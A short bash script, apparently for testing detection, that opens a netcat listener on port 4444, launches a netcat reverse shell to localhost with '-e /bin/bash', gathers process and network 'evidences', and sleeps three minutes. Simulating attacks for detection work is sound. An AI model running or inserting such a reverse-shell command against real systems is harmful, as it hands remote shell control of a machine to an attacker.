#!/bin/bash

echo "Start listener on port 4444"
nc -lvp 4444 &
sleep 3
echo "Reverse shell execution"
nc 127.0.0.1 4444 -e /bin/bash &
sleep 3
echo "Get evidences"
ps aux | grep "nc\|bash"
netstat -otnp | grep 4444
echo "Go sleep for 3 minutes"
sleep 180